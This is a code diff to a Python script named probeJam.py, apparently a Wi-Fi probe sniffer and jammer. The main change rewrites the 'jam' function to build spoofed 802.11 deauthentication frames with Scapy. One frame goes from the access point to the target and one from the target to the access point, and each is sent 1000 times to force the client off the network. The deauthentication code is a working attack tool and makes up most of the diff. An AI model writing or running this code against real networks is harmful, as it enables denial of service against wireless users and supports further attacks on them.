@@ -112,7 +112,7 @@ def argumentTreat(args):
         probeSniff(iface)
 
 
-# Basically just a start-up menu
+# Basically just a start-up screen
 def printVerboseDetails():
     print W + "probeJam.py"
     print "Version: %s" % VERSION
@@ -124,24 +124,23 @@ def printVerboseDetails():
 # Takes in the interface, targetMac and apMac
 # Struggle to jam crap :(
 def jam(iface, targetMac, apMac):
-    print targetMac
-    print apMac
-    # Create a packet that goes to the target from the ap
-    jamPacketClient = RadioTap()/Dot11(type=0,subtype=12, addr1 = targetMac,
-        addr2 = apMac, addr3 = apMac)/Dot11Deauth(reason=7)
-    
-    jamPacketAp = RadioTap()/Dot11(type=0,subtype=12,addr1 = apMac,
-        addr2 = targetMac, addr3 = targetMac)/Dot11Deauth(reason=7)
-    
-    send (jamPacketClient, count=100)
-    send (jamPacketAp, count =   100)
-    #i = 0
-    #while (i < 1000):
-    #    i += 1
-    #    send(jamPacketAp, count=100)
-    #    send(jamPacketClient, count=100)
-    #send(jamPacketAp, count=100) # send 100 packets
+    packets = [] # Empty array to store packets in
 
+    deAuth1 = RadioTap()/Dot11(type = 0, subtype = 12,
+        addr1 = targetMac.lower(),
+        addr2 = apMac.lower(), 
+        addr3 = apMac.lower())/Dot11Deauth(reason = 3)
+
+    deAuth2 = RadioTap()/Dot11(type = 0, subtype = 12,
+        addr1 = apMac.lower(),
+        addr2 = targetMac.lower(), 
+        addr3 = targetMac.lower())/Dot11Deauth(reason = 3)
+
+    packets.append(deAuth1)
+    packets.append(deAuth2)
+
+    for packet in packets:
+        send(packet, count = 1000)
 
 
 # The sniffer part
@@ -186,6 +185,7 @@ def myFuckingsFilter(packet):
 
 # Write the log to a file when you kill the program
 def kill(signal, frame):
+    print "\n"
     if ('logFile' in globals()):
         print R+"\nWriting to file"
         f = open(logFile, "w")
